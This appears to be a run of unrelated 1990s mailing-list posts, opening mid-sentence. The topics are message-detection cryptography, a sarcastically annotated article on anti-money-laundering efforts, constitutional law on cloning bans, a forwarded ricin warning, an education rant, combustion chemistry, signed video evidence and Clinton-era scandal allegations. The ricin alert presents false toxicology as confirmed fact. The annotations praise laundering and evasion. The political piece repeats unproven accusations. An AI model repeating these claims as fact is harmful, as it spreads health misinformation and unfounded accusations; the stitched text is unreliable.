used to calculate the flag value to be expected for the next message
from each sender, which can be compared against each potential
For both methods 1A and 1B, once the message is recognized a shared
secret key is used to decrypt the remainder of the data past the flag
portion.  The shared secret key can be changed after each message
using similar techniques to changing the flags.  (Safety tip: don't
make the shared secret key the same as the flag value.)
Method 2: For finding messages sent by someone you have never communicated
with previously.
Method 2A: Sender encrypts a low-entropy flag message with receiver's
public key, pads it so it looks like random noise, and puts that at
the start of each message.  Receiver decrypts the beginning of each
message using his private key, looking to see if the results are low
entropy.  When such a message is detected the secret key for
decrypting the remainder of the message can be embedded in the
low-entropy portion.
Method 2B: Like 2A, but use Fiat's "Batch RSA" to decrypt multiple
messages in one batch.  Recipient publishes his public key with
multiple legal exponents (say, the first 16 primes).  Sender encrypts
his low-entropy message choosing one of the encryption exponents at
random.  He checks to see if the low bits of the encryption output
match the index of the encryption exponent (e.g. if the 7th encryption
exponent was chosen then the low order 4 bits should hold the value
7).  He repeatedly encrypts with different random padding until he
finds an encrypted form which properly encodes the exponent.  Receiver
batches messages together such that the low order 4 bits of each
message in the batch are different, and applies the Batch RSA
decryption to try decrypting each message.  As before the receiver
looks to see if the result is low entropy.
For both 2A and 2B it may be possible to do the decryption using only
one of the two RSA primes, if the encrypted data was smaller than that
prime value.  (This idea comes from Shamir.)  Even if not, the Batch
RSA algorithm can be applied separately for the two primes and then
the results combined at the end for each message via the CRT, as is
often done for RSA decryption.

The following series of posts is extracted from E-Communist. In this article the writer (but a mere cog in the Anonymous Entity known as GovernMedia NLC), exhibits the guVermin cheerleading so pervasive among those in his/her profession.
In keeping with the spirit of anonymous advocacy favoring global fiscal tyranny, "our" collectivistic comments are in brackets as indicated: [S'n'S]
Originally assigned the staid title 'Money Laundering', "we" have taken the
indecent liberty of naming each post separately:
countries set up the Financial Action Task Force (FATF) [not to be confused
with the BATF] in 1989. Based at the OECD [worthle$$ bureaucracy  in Paris, this now has 26 member countries, which are supposed to abide by
its 40 recommendations. Among other things, these encourage mutual assistance in laundering cases. International co-operation is also being fostered by financial-intelligence units [FiUs], some of which recently set up a special computer network to swap information about laundering cases.
A statistical black hole
What effect has all this had? It is hard to tell for sure, but such evidence
as looks reliable is hardly encouraging [discouraging]. A report published in 1995 by AUSTRAC, [worthle$$ bureaucracy  Australia's financial-intelligence unit, concluded that between A$1 billion and A$4.5
billion ($740m-3.3 billion) was washed through Australia each year. The
report noted that if this figure is accurate, then Australian poLice were
recouping [recouping?, proceeds of voluntary exchanges are considered stolen
when in fact those doing the "recouping" are the criminals] barely 1% of all
the ["]dirty["] money that they [_]guess[_] is flowing into [but not flowing
out of? It must be all those "dirty" foreigners corrupting the innocent Aussie drug addicts and tax evaders] the country--a surprisingly low figure
given that Australia is widely acknowledged to have one of the most comprehensive anti-laundering regimes in the world.
[so AUSTRAC thugs are basing their conclusions on guesstimates, which, if
as accurate as they kinda sorta think they might be indicates:
Minions of the Australian FIU stole, that is, recouped, some 10-45mil AUD in cash and an unspecified amount of other property, but this is "barely 1%"
of the _potential_ bounty to be had in the lucrative worldwide industry of
asset forfeiture.
Allow me to "guesstimate" a couple of other conclusions they may have made:
1) AUSTRAC lacks sufficient funding (AUSTRAC clerks still lack vacation 2) AUSTRAC lacks sufficient personnel (AUSTRAC entry teams are still without
When it comes to prosecutions of money launderers, few countries keep reliable statistics, often because laundering was only recently deemed a separate ["]crime["]. One that does is the Netherlands. According to its
justice ministry, in 1995 some 16,125 [subjectively] ["]suspect["] transactions were reported to the country's financial-intelligence [looting]
unit. Only 14% of these were sufficiently dubious [read: juicy confiscatable
assets of sufficient size coming to their attention due to amateurish
operations that lacked political protection which made these "suspect" assets worth the time and effort to grab] to pass to the poLice, and only 0.5% of the original total led to prosecutions. [no mention of the % of cases that led to confiscations] Anecdotal evidence suggests a similar lack-of-["]success["] elsewhere.
Why aren't more laundrymen being caught? [what about laundrywomen, the sexist pigs!] The answer, say those leading the fight against dirty [free]
money, is that most anti-laundering regimes are still in their infancy. [yet
to grow into the horrid monsters of their wet dreams] But, they say, at least the situation is improving. [deteriorating] Stanley Morris, FINCEN's
[worthle$$ named bureaucracy  director [thug], says undercover operations
in America show that launderers' fees have risen from around 6% of the money
washed in the early 1980s, to 25-28% today. The explanation is that laundering is getting harder and riskier--and hence more expensive. Some experts also claim that a recent increase in the ["]smuggling["] of cash across borders is a sign that [gasp] more ["]criminal["] ["]loot["] is shunning banks. [meaning people are fed up with American banks, American regulators and America in general: "sell off, cash in and drop out".]
There has also been some progress internationally. A few well-known haunts
of launderers, such as Switzerland and the Cayman Islands, have made it easier for bankers to report ["]suspect["] transactions [reclaiming lost virginity] without breaking bank-secrecy laws, and for their financial gumshoes to co-operate with foreign ones. [meaning they already have so much
money on deposit that it won't effect profits significantly, besides which, the typical lazy African dictators' first choice remains CH and those who
are concerned about such matters have long since moved to greener pastures
anyway...] In February, Antigua, another Caribbean haven, closed five out of
six Russian offshore banks because of concerns that they had been laundering
money for Russia's mafia. [no security through obscurity there] The FATF has
also cracked down. [pun intended?] Last year, for the first time, it publicly upbraided one of its members, Turkey, for not introducing an anti-laundering law. [Turkey, a typical 3rd world pit, is too busy stealing
from its citizens via hyperinflation to bother with passing pro-looting legislation.] And it gave banks a warning abot dealing with Seychelles after
the government offered anyone placing $10m or more in certain investments immunity from prosecution [no STO there either]. The law containing this open invitation [more like comic relief] to crooked cash has since been Fly low

Taken to the cleaners
["]Un["]fortunately, some of this is not as encouraging as it sounds. For a start, the ["]dirty["] money leaving banks may end up polluting other businesses [MONEY LAUNDERING IS GOOD FOR BUSINESS]. PoLice in Texas
say that foreign-exchange bureaux there have been a primary conduit for
channelling drug money to and from Mexico. Insurers are also vulnerable. One
recent laundering wheeze involves buying single-premium insurance policies
with ["]dirty["] money. These are then cashed in early in return for a "clean" cheque from the insurer, or used as collateral for a bank loan.
[On the way: Currency Transaction Reports for purchase of insurance policies
with cash and Early Redemption Reports for policies held less than 50 years.
Insurance agents will be required to report "suspicious" policy holders and
report possible "structuring" violations. Then they'll wonder why customers
are "shunning" insurance companies.] Even the rising cost of laundering may
not be unalloyed good news. It may simply reflect the emergence of a new group of professional launderers who are better at beating the system, and
charge more for doing so. [Or as Comrade Clinton would put it, "getting their fair share"] Some poLiceman fear that these experts may soon be using
electronic-cash systems to speed up the wash cycle (see box on next page).
[See post 4/4]
Worse [Better], as old laundering centres close their doors, new ones are opening theirs. The table above [shown below this paragraph] shows the countries that the State Department thinks face a severe money-laundering problem. (Even states with tough anti-laundering rules, such as America and Britain, are listed if their vigilance is considered essential in the
global fight against laundering.) The striking thing about the ranking is that it includes islands such as Cyprus, a ["]hive["] of offshore activity
for the Russian mafia, and Aruba, a Dutch dependency in the Caribbean, which
were not associated with laundering a few years ago. [Translation: Aruba
et. al. have always been on their shit list, and now that they've taken out the higher-priority targets e.g. CH and Cayman, the NWO _Microchip Extremists_
are setting their sights on shutting down the lower-yield peripheral sites.
(which they've "only just recently discovered" are pro-privacy areas)]
Another notable inclusion is Mexico, which the report describes as "the
money-laundering haven of choice for initial placement of US currency in the
world's financial system". In March, the [criminal] Mexican government unveiled a series of anti-laundering [fig leaf] measures in a belated effort
to clean up its reputation.

In the future, more Asian countries could be added to the list. Rick McDonell [, looter ], the FATF's representative [of Satan] in Asia, warns that the region is ["]vulnerable["] to laundering because many of its economies are heavily cash-based. [Solution: go hire Jerry Seinfeld, Patrick Stewart and all the other convenience-card whores to shill for the cashless
society in Bangkok, Guangzhou and Kuala Lumpur?] Moreover, some countries such as India and Pakistan have large "underground" banking systems which sit alongside official ones [hawala]. Usually based on family or regional networks, these shift large amounts of money [and other stored units of value, e.g. crates of Avtomat Kalashnikova, "illegal" cash crops, RPGs, precious stones] around anonymously and cheaply. [25-28% markup indeed! Forget that rubbish] Such attractions, plus a lack of anti-laundering legislation, have already turned Thailand into a launderers' paradise. A report published last year [yet another report, this journalist needs to get
out into the real world, hanging with fiscal bureaucrats and professors is stunting Anon-E-Communists' growth] by Bangkok's Chulalongkorn University put the amount of money washing through the country each year at 730 billion
baht ($28.5 billion). This is equivalent to 15% of Thai GDP.

Next, cyberlaundering?
If there is one thing that money launderers hate it is cash; physical cash,
that is [No, we hate criminal governments who refuse to issue larger denomination notes]. Shipping huge wads of banknotes is a logistical nightmare [which would be less onerous if, by way of example, the US guVermin recirculated $500, $1000, $5000 and $10,000 FRNs. The printing plates for such "money-laundering friendly" notes having been de-activated since the reign of dictator Roosevelt; refusal to issue higher denomination FRNs to keep pace with Accumulated Wealth Tax extractions (commonly referred
to as "inflation") since the 1930s is nothing less than slow-motion, backdoor currency recall]. It also raises the risk that couriers will be intercepted [they mean robbed] and the ["]loot["] traced back to its source.
Transferring money electronically is both quicker and easier [but not necessarily safer in certain nations]. [*]Hence concerns in law-enforcement circles that new forms of electronic money could render obsolete traditional
methods of tracking ["]tainted["] money, which rely heavily on the poLicing
of bank transactions[*]. ["Hence concerns in law-evasion circles that new forms of vooter sanity threatening to outlaw drug Prohibition could render obsolete traditional streams of tax-free income."]
["Hence concerns in law-enforcement circles that new forms of vooter sanity threatening to outlaw drug Prohibition could render obsolete traditional pretexts for increased budgets, privacy deprivation and sheeple tracking."]
Electronic-money systems come in three different forms. There are stored-value cards, which allow customers to load money onto a microchip-bearing piece of plastic. This can then be carried around like a credit card. There are computer-based systems, for example, those involving
payments over the Internet. and there is talk of hybrid systems, which allow
smart cards and network-based payments to work together.
Although these new gizmos are still under development, financial regulators
and policemen have been studying them intently. And they have raised several
questions to which they want answers. One is whether limits will be placed
on value that can be held on chip-bearing cards. A card without a limit
"could break my back", [then there would be no need for a tree] worries Stanley Morris, [the anti-christ, ] who heads FINCEN, the American government's financial-intelligence unit [FiU]. He thinks launderers could use it to shift millions of dollars on a piece of plastic.
The anti-laundering brigade [brigands?!] also wants reassurance that crooks
will not be able to set themselves up as e-money issuers. [I guess as opposed to the crooks who set themselves up as fiat banknote issuers] And they want to know whether all transactions in whatever system will be logged
at a central point, so that investigators can reconstruct an [unencrypted??]
electronic audit trail ["]if necessary["]. [B.S., they don't "want reassurance" or "want to know" squat, this is their non-negotiable DEMAND; they will try to rob, kidnap, jail, and murder anyone who thinks different] At least one card-based system currently being developed by Mondex, a company owned by Master-Card, [MassaCard] is designed to allow money to be
transferred directly between cards, without leaving such a trail. DigiCash,
which is developing a computer-based payment system, is using what it calls
a "one-way privacy" method, which allows payers to check who received money
from them, but does not allow the recipients to find out where it came from.
[as in a postal money order (but sans the silly $700 per m.o. limit and the
ridiculous $2999.99 daily limit) sent to a payee anonymously]
While these and other issues, such as who will have jurisdiction over
laundering on the Internet, [I smell a brand new Global Bureaucracy in the air] suggest the new systems could cause the authorities a few headaches,
some experts beg to differ. A report published last year by the Bank for
International Settlements, [another report cited, another worthle$$ bureaucracy, amazing isn't it?] the central bankers' central bank, [in other
words, a den of iniquity] noted that in most cases, measures designed to
protect the new systems against fraud--such as attaching unique electronic
serial numbers to transactions--would make them less attractive for criminal
activities than many existing payment systems. At the moment, all financial
regulators can do is watch and wait.

Whitewash	[The Predictable Agenda Revealed]
All these developments suggest that the world's existing ["]defences["]
against ["]dirty["] money are ["]inadequate["]. [And we all know what their
definition of "adequate" would be.] [*]Banking secrecy is a serious problem[*]. As the table shows, bankers in a number of "high-priority"
centres can still be prosecuted [heaven forbid!] if they hand over
confidential information to officials investigating laundering cases.
[So, absent probable cause that a _real_ crime has been committed, "officials" must be allowed to engage in fishing expeditions without
Therefore, we must give these "officials" carte blanche access to:
   1) private (actually public) bank data.
   2) safe deposit boxes (send a spare key to FATF when you rent a box).
   3) private records (unrecoverable encryption made a felony).
   4) physical warrantless searches of "suspected currency smugglers"
Carte Blanche access is the ultimate goal.
All done "confidentially" you understand. I won't tell the victim if you don't. And people would wonder why I don't have a domestic bank account.]
It also shows that several of these centres have yet to extend their
anti-laundering regimes to cover non-bank financial institutions. [the operative word being _yet_.] No wonder some financial poLiceman claim they
are being asked to fight laundrymen with one hand tied behind their backs. [a straightjacket and possibly rope + oak tree would be appropriate ]
As if that were not bad [good] enough, the current approach to tackling the
[non-]problem of onshore and offshore laundering havens is flawed, too. The
FATF has done some useful work, [like what exactly?] but it has not been
tough enough with slowcoaches. It only censured Turkey several years after
it became a member. [Turkey should tell this ATF to go take a flying leap]
And it has yet to take action against Austria, another member, which still
has anonymous savings accounts [which due to their membership in the reconstituted Holy Roman Empire they will eventually sell out or at best
phase out with grandfather clauses] for its citizens [and many non-citizens as well, leave our Sparbuchen alone thank you very much] despite an FATF
[*]edict[*] banning anonymity.
[A most curious use of language: "despite an edict banning anonymity". And just who is it that supposedly granted FATF the authority to issue _edicts_
(as in dictate, force, coerce) or _ban_ a single goddamn thing?! Apparently a collective "hive" of enthroned, unaccountable, power-usurping bureaucrats are justifying their existence by rendering decisions "for" the
little people and sees itself fit to spew forth proclamations unbeknownst to
many under imaginary authority it has granted unto itself. How very regal of
Is said edict (banning anon accounts) an example of the "useful work" this _anonymous_ journalist refers to? The irony is delicious. Does this represent the type of government-by-edict rule that he/she/it finds so agreeable? Perhaps she-he-it spends too much time attending WTO meetings and
schmoozing with those-who-know-better to discuss the latest nuances of
negotiated edict proclamations. You (anonymous, E-Communist writer) need to get out more, buckwheat.
How about putting this edict thingy up for a vote of the Austrian people?
An antiquated idea I realize but it would give you and your associates an
opportunity to further propagandize the great unwashed to the cause of
Total State Control.
OTOH, then these aspiring fiscal tyrants would have to crawl out of their
committee meetings and explain to the rabble why it is so urgent that private banking be abolished (confidentially, of course).
Besides which, owners of anonymous accounts like them just the way they are
and would find another way to keep their property out of your greedy little
paws regardless (even if you did somehow manage to convince 50.0001% of the
vooters to help you fight non-crime. "We" don't have to show you no steeenkin' passport).]
Some anti-laundering campaigners say that criticism of members in evaluation
reports is often watered down for diplomatic reasons [how can an evaluation
be watered down when it starts with zero substance?]. "Every report was put
through so many whitewashes", complains Sue Thornhill, [parasite, ] a consultant on laundering to the British Bankers Association. The FATF's fans
[such as they are outside the GovernMedia sphere of influence] admit that some plea-bargaining goes on, but insist that it does not let countries off lightly. [What is this utter nonsense: Are representatives of "guilty" nations hauled off to some FATF Star Chamber
and forced to perform lewd acts with smart cards?!?]
Whatever the truth, [the truth being that money laundering is not a crime;
acknowledgment of which would run counter to your basic philosophical premise and thus be dismissed as extremist libertarian kookery] there is an
even bigger problem with the task force's approach [the problem is the existence of FATF and other agencies of its ilk]. Every time it persuades a financial centre [against it's best interests] to crack down on laundering, crooks will move to new ones [as would any normal person who
places a value on customer service]. As the amount of money that comes with
them grows, so the incentive for these other havens to change their ways will dimish. [until they become fat and happy like Helvetia, then they begin
to evidence a strange desire to look 'respectable' in front of the 'world community' and now readily strap on the knee-pads for their pimp: the United
States] The FATF seems to be hoping that peer-group pressure is the solution. [Oh yeah? Just because your friends have abolished (de facto) bank
secrecy and have ceased jailing informants and foreign moles does that mean
you're going to do it as well? What would your mother say about that?] It has set up a regional Caribbean task [tax] force and is ["]supporting["] the
creation of an Asia-Pacific anti-laundering group. [picture an enterprising
cretin at FATF calling some string-puller over at the IMF: 'Tell them to give us all the access we want to foreign account holder data or else no more taxpayer coerced bailout for you Asians'...] But even if this attempt to sign up new members works, such an approach will take a long time. And there is a danger that many members will sign up to get the FATF's badge of respectability [and the cushy do-nothing jobs that go along with it for political hacks and career bureaucrats], and then drag their feet over implementing its recommendations. [confusing, are they _edicts_ or _recommendations_ ?]
So are economic sanctions against refuseniks the answer? The sort of
"economic warfare" envisaged by Senator Kerry is not. Banning citizen[-hostage]s of a few rich countries from dealing with known
laundromats would hurt legitimate businesses, while crafty launderers would
find ways round the restrictions. [Senator Kerry, (Looter-Taxachusetts): "Yeah right, that's a wimpy apologetic journalist pretending to present both sides of an issue, let's get real here, no _legitimate_ business would need to have an Aruban
bank account when our local S&L offers backup withholding, full disclosure on request to any and all government employees, demands for SSN's and fingerprints, deposit insurance and CTRs, in short all the protection and benefits the surveillance state has to offer. So those who have the mistaken
notion that all assets DO NOT belong to the state and DO NOT submit to the fact that those assets they are trying to keep from our grasp belong TO US and are only on temporary loan to individual shee, um, people need to be set
straight and made an example of. I say we must pull another Panama and invade these small narco-terrorist haven countries and shut all their banks
down permanently. If citizens of these pathetic excuses for states want a bank account, our good Bwoston banks are more than happy to serve them."]
That leaves Mr Tanzi's proposed strategy as the only current proposal with something to recommend it. Of course, getting an international agreement on
minimum anti-laundering standards will not be an easy task. But it is worth
a try. For without a concerted global response [= global surveillance of every transaction = dictatorial global bureaucracies] to the problem of ["]dirty["] money, the world's money-laundering machine will be off on yet another devastating [to whom?] cycle.
Banking secrecy is a serious problem.
Unreported asset possession is a serious problem.
Non-governmental ComSec is a serious problem.
Non-intelligence-agency laundering is a serious problem.
Anonymous ownership transfers are a serious problem.
Unreported cash transactions are a serious problem.

Actually, not at all.
There is no ban on publishing information on cloning, "just" a ban on the
activity.  Hence the first amendment is not implicated.  If it were the
case the every action (as opposed to speech/publication) were protected by
the 1st Am. then every statute making robbery a crime would be
unconstitutional too.
Similarly, the 4th Am. is not implicated.  The right to be secure against
UNREASONABLE search and seizure is not violated when and if congress
passes a law defining a new crime, or you are arrested for committing it.
again, note that the ban is on CLONING, not THINKING OR WRITING OR READING
about cloning.  It's not the same thing. This is an aside, but the CRA is in no way anomalous given the 13th, 14th
and 15th Amendments.  It is only "anomalous" if one sticks to the
Constitution as written in the 18th century... and ignores the articles
written in that same century that clearly contemplate amendments....
Arguably, many of the legal bans in force today are due to ethics, e.g.:
* bans on suicide
* bans on plural marriage
* bans on certain abortions
* bans on ingestion of some substances
The courts in their infinite wisdom have not found these to be
unconstitutional laws.
Again, this misunderstands somewhat: the ban is on EXPERIMENTS (which are
indeed part of the search for truth), but not writing, reading thinking
Not directly, IMHO.

This is a more significant difference than you let on: if the research is
done abroad, it can be published here.  To the extent that one can
theorize without experimenting, that too can be done here.  Congress has the power to choose whether to ban acts when the cause a harm
(fists that connect to federal noses), or just to ban acts whether or not
they cause harms (sending threats to government officials; broadcasting
without a license on an unused frequency).  Like it or not, there is no
question that most of these bans -- including the cloning ban -- are
constitutional under the commerce and other powers, the copyrights clause
notwithstanding. PS.  I killfiled this guy ages ago on the grounds of rudeness, general
unpleasantness, and especially a complete and utter incomprehension about
how the law in this country operates.  It is as if someone once read some
software company's publicity about how easy it is to operate their
software and concluded they should therefore be able to write programs in
any language.  Since someone forwarded me this post, I'm replying to it, but I doubt I'll
bother doing so in the future.  I entered this thread because Tim May made
some comments; I respect his writing and I think other people probably do
too.  As a result, it seemed important to offer some basic doctrine as a
response.  Note, again, that I'm not expressing a view on the MERITS of
the legislation, just one law professor's view on whether courts would be
likely to uphold it if it passes. A. Michael Froomkin        � +1 (305) 284-4285; +1 (305) 284-6506 (fax)

Forward from Terrorism list:
Bureau of Narcotic Enforcement
Merced/Mariposa Narcotic Task Force
RE: RICIN Alert
The Sacramento Regional Office of the Bureau of Narcotic Enforcement has offered this alert to all it's personnel:
  "The following alert has been confirmed and is being shared   throughout the law enforcement and intelligence community.
  This alert advises that nationwide trend among drug traffickers is to   "bait" law enforcement officers with a white powder called RICIN.   RICIN is a derivative of Castor beans and looks like powder   methamphetamine. It is highly toxic and if it contacts human skin, it   is fatal. The death process takes several days, depending upon the   dosage, and is almost impossible to detect during an autopsy.
  Forensic experts advise that if you field test RICIN in the Scott   Reagent Kit, it will foam and bubble extensively. The test will also   produce a gas that is very similar to mustard gas and can also be   lethal if inhaled. RICIN is 6,000 times more lethal than cyanide and   there is no antidote. Symptoms of contact exposure to RICIN are:   Fever, cough, weakness, and hypothermia, progressing to dangerously   low blood pressure, heart failure and death.
  Due to this situation, in the event of suspect drug seziures, do not   come into direct skin contact with any powdered substances, and   exhibit caution of field testing any powdered substances."
We are forwarding this advisory to all California EMS Agencies and recommend that each agency contact the local hospitals in their area. We are unaware if RICIN can be detected on a toxicological exam.
There is a potential for someone, other than law enforcement, to become contaminated with this substance.

Most of the people buying NT are the same people who bought their last
OS from Microsoft, and don't feel like trying anything new.  Sun's real
problem is that they were charging much more for their computers than
it would cost to put together the parts.  Hence, the drop in demand.

have absolutely no clue about basic science, and most have absolutely no
idea about the Bill of Rights and freedom of speech[1].

3) How many chromosomes are in a normal, healthy human?
4) Joe is one of your classmates. He elects not to say the "Pledge of

    b) Congress shall not restrict freedom of speech, the press, assembly,

Keep in mind that I'm talking about high school graduates or people who have
almost graduated high school here, and these are people who have taken the
appropriate courses. Back in high school I made the mistake of making some comments and assuming
in class discussions that people had basic knowledge. I was wrong. Okay, so
I was naive. Eventually I gave up and stopped participating simply because I
was sick and tired of doing the school's job for them.
1) Most students probably won't have any idea. The value, of course, is
about 9.81 m/s^2. 10 m/s^2 doesn't work although that's given in the
mathematics books they give these kids. Most of them probably won't even
know what the question is asking.
2) I actually brought this topic up to a group of *honors* students. Think
of the expression "shove you out an airlock" for context. They boggled,
wallowed in their ignorance and were proud, and then went off to their think
tank. After confering with each other they came back with the breathtakingly
brilliant answer that it was a contraceptive device. Of course even after
explaining to them what it was they still didn't get the reference, had no
grasp of how such a thing might work, and had no idea what it might be
useful for.
3) This is taught in elementary biology which, at least down here, is a
required course. They had no idea. Actually, most of them had no clue about
basic genetics at all. Yes, basic genetics was covered in the course, and
this material was included.
4) I was "Joe" in this case. The people involved had already taken a
semester government course. Their answer to the question would have been
along the lines of option 'd'.
5) I made a big mistake assuming they knew this one. Oops. 6) Most seemed to believe 'b' or 'd'. Maybe they knew it was 'a' and thought
that maybe people wouldn't notice.
7) I made the mistake of using designations like this in a political science
class during a class discussion. I regretted it when I had to start
explaining these agencies and what they were supposed to be responsible for.
8) No explanation required.
9) "You expect me to memorize that for all 50 states?" "Nevermind."
10) Shakespeare. It wouldn't be so bad if they hadn't had to read Hamlet,
MacBeth, and others in their English classes. Yipes.
11) "How am I supposed to know?" "Uh, you got out of chemistry with a B."
"Yes, but they never gave me problems like that!" Uhhh...
12) Most probably couldn't solve it without a calculator.
13) Ditto.
14) Ditto.
15) They'll probably look at you like you're nuts and explain that you
can't. Uh, right.
16) In an international relations class I took students picked a side and
tried to argue it. Mine was pro-cloning or, more accurately, pro-science. Most were anti-cloning. Why?
    a) "God doesn't like us to do things like that." Right. Let's go outlaw
       fields of research based on one religion and what followers of one
       religion think their god is thinking at that moment. This is        America, not Iraq.
    b) "How would you like it if somebody just came up and cloned you
       without you knowing and then made that person tell them information
       you refused to give them yourself?" Okay, I can buy the unwillful
       cloning part of it and could support a law on the grounds that it's
       theft of genetic material or for a variety of other reasons. As        for the rest of that...ugh.
Now maybe people on this list can't answer some of these either. That isn't
the point. The point is that you should have been taught this stuff in
school. Klintonkov wants to go blow millions (billions?) of dollars for
censored network feeds in the schools and they haven't even got basic
education down? And don't say "computer literacy" either. Most high school
graduates can barely type on the bloody things, and they can forget about
actually fixing a problem themselves. The *teachers* are blatently clueless.
When Klintonkov fixes these problems he can talk about "wiring our schools
for the 21st century." Of course then he'll want to censor the feeds or the
net at large, at which point we're back to square one and should spend the
money on something useful, like paying off the multi-trillion dollar debt the idiots ran up.
Here's the scariest part of it all: These people are voting! And we wonder
why we're in such a mess.
The war isn't the war between the blacks and the whites, the liberals and the conservatives, or the Federation and the Romulans. It's between the clueful and the clueless.

As usual Jim, your posting is prolific but your science is lacking.
Since N2 is highly stable, CN ions are not an energetically favored result. Some amount may be produced, but CN- is highly reactive and will quickly
bind to whatever it comes in contact with (usually oxygen).  The only way
cyanide could escape in gaseous form is as HCN, however this cannot happen
because the hydrogen has a lower activation energy for combining with
oxygen, and thus the reaction is starved of free hydrogen by the time the
carbon begins to burn.  Various other nitrogen compounds are produced,
such as NOx, but this is true of all combustion and not limited to plastic.
A more likely (and deadly) result, which you did not mention, is sulfur
dioxide.  Most plastics don't contain sulfur, but rubber products may.
Sulfur dioxide combines with water to produce H2SO3 and H2SO4 (sulfuric
acid) which is quite toxic if inhaled.
Most smoke inhalation deaths result for particles clogging the lungs rather
than gases.  Cats have a tendency to hide when they feel threatened or
injured, an instinct which often imperils them in a burning building.
Also remember that computers have materials in them other than plastic, for
example lead and other heavy metals.  Batteries and electrolytic capacitors
are also sources of many toxic materials.
In short, it's not the plastic that's toxic, it's all the other crap (ink,
dye, glue, solder, batteries, dielectric, etc)

@_subject: Video & cryptography... 
Remember what your target is here.  (Focus, Pinky!)
The ultimate goal is that you're trying to convict a suspect of some wrongdoing in a courtroom, and you would like to use as evidence a piece of video footage.  But now, in addition to the old standard of "chain of possession" whereby a police officer logs when s/he receives the evidence, who has accessed it in the lab, storage, etc., you may now be required to establish the "truth" of the video -- was it forged, staged, or altered?  Can the defense convince a jury that a video is not what it appears to be?
Look at the O.J. case where they convinced people that a piece of DNA might not have been his.  What a load of malarkey they heaped upon those people, and shame on the prosecution for not going back and matching up another 50 markers, dropping the chances of an error from 1 in 3*10^12 to 1 in 3*10^60.  (Ultimately, it wouldn't have mattered of course because they pointed out other "flaws" in the chain of possession, specifically the FBI crime lab.  Why they might have had a *different* case with O.J.'s blood is beyond me...  They could have retested the DNA from every cell in evidence on that trial, found only Nicole's, Goldman's and Simpson's DNA, and STILL they would have gotten it thrown out, because jurors are incapable of understanding math.)
What this means to us is that, in a courtroom, a signed piece of digital tape will probably be accepted the same as an unsigned piece of analog tape.  The courts have already established precedent that says that the scientific method has less value than an overpriced lawyer.
Think about it:  what we strive for as a cryptographic proof means less than the unsworn audio tape from a 21 year old intern.  If some lawyer wants to challenge a piece of video, and can throw enough money at it, s/he's going to win.  You're better off spending money training the persons operating the VCR, because that's the defense's next point of attack.
The idea behind the digitally signed video frames is that the video "consumer" (the persons who shot and recorded the video) probably didn't edit the video to falsify some evidence, and that the person who built the camera is willing to go to court to testify that their video is not tampered with.  As a video "consumer", you're willing to pay for a witness from the video equipment supplier to come testify that you didn't edit their video.  It theoretically (in a certain, very limited subset of theory) eliminates the "Rising Sun" plotline where someone edited the digital video.
Now, we all know that since you can falsify the video by all kinds of other means, the only thing it really accomplishes is it adds a float to the parade going past the jury.  And whoever has the prettiest parade wins "justice", right?

It has been fifteen years since I even opened a chemistry book, but I think
what you're looking for is called the "heat of enthalpy." You could find
this in most any intro-level chem book, and there's probably a whole
shitload of reactions listed in the _CRC Handbook Of Chemistry & Physics_.
Since HCl+NaOH is an acid-base reaction, you could also use something
called the "heat of neutralization." IIRC, that's something like 57 KJ/mol
for strong acids. But don't take my word for it; I'm Not A Chemist Any
More. P-Chem gave me a great appreciation for math and computers.

AND NOW THE NEWS . . .
ACCESSORY AFTER THE FACT: THE MEDIA
AND THE CLINTON SCANDALS
Because it controls its own medium and can revise history at will, one
accessory after the fact in the Clinton scandals is almost certain to
remain unscathed: the media. From the beginning, journalists created a
fantasy portrait of Bill Clinton as a brilliant visionary, managerial
superman, and charismatic leader. During the New Hampshire primary in 1992,
the New Republic's Hendrik Hertzberg surveyed several dozen journalists and
found that all of them, had they been New Hampshire voters, would have
chosen Clinton. He suggested that, "the real reason members of the press
like Clinton is simple, and surprisingly uncynical: they think he would
make a very good, perhaps a great, president. Several told me they were
convinced that Clinton is the most talented presidential candidate they
have ever encountered, JFK included."
Not only was there no substantive evidence for such a conclusion, there was
plenty to suggest that Clinton was instead a politician of no fixed
philosophical or moral address, a man who began with compromise and
retreated from there, and a rampantly mundane governor. More importantly,
he was known to be less than honest, a sexual predator, and hung out with
some of the sleaziest types in his state.
"At the beginning of the 1992 campaign, few of us knew -- let alone
remembered -- anything about Bill Clinton. If we were not from Arkansas, we
had nothing for which to thank him. And our whirlwind relationship, our
arranged marriage, was under the constant control of the great American
matchmaker: the media. Clinton's past was not only unimportant to him, but
to us as well.
"In an earlier time, Clinton's non-history would have been an enormous
disqualification. Now it wasn't because Clinton had one huge edge over his
opponents: he looked and acted well on TV. Tom Harkin moved and spoke as
mechanically as the Energizer bunny; Kerry's personality and platform
remained a cipher; Tsongas talked funny; Brown was didactic; but Clinton
was at home.
"Against this advantage, facts faltered. The facts said that Clinton had
been an unexceptional governor. He could claim better prenatal care
programs and a decline in infant mortality, but at the same time the Center
for the Study of Social Policy would rate the state only 41st on children's
issues in general. Arkansas also ranked -- according to the Southern
Regional Council -- in the bottom ten percent of all states in average
weekly wages; health insurance coverage, state and local school revenue;
unemployment; blacks and women in traditional white male jobs;
environmental policy and overall conditions for workers.
"An examination of his record raised warning flags, not the least of which
were rocky relationships with labor and environmentalists. At the beginning
of the campaign Clinton came under attack by his state's AFL-CIO president
who (before the national union ordered him to shut up) sent around a highly
critical report on Clinton's record. Labor, said Bill Becker, should expect
Clinton's help only 25-30% of the time. And the League of Conservation
Voters ranked Clinton last among the Democratic candidates on conservation
"Greater attention to Clinton's record also might have brought to more
prominent notice the major tax increases during his tenure. Or the comment
by the union official who said that Clinton would slap you on the back and
piss down your leg. Or the tendency to waffle on issues. . . ."
There were still more serious questions, well summarized by Ambrose Evans-
Pritchard of London's Telegraph:
"The Clintons are attractive on the surface. As Yale Law School graduates
they have mastered the language and style of the mandarin class. It is only
when you walk through the mirrors into the Arkansas underworld whence they
came that you begin to realize that something is wrong. You learn that Bill
Clinton grew up in the Dixie Mafia stronghold of Hot Springs, and that his
brother was a drug dealer with ties to the Medilin Cartel. You learn that a
cocaine distributor named Dan Lasater was an intimate friend, and that
Lasater's top aide would later be given a post in charge of administration
(and drug testing) at the White House. You learn that Arkansas was a mini-
Colombia within the United States, infested by narco-corruption."
For such reasons, by the spring of 1992 I had become convinced that the
media portrayal of the Clintons was a fraud. Based on published material
available to any reporter in the country, I wrote a "Who's Who of Arkansas"
listing questionable individuals and institutions in the state and
illustrating their links. Included were Dan Lasater, Roger Clinton, Tyson's
Foods, Webb Hubbell, Buddy Young, the Arkansas Development Finance
Authority, the Worthen Bank, the Rose law firm, Stephens Inc, Larry Nichols,
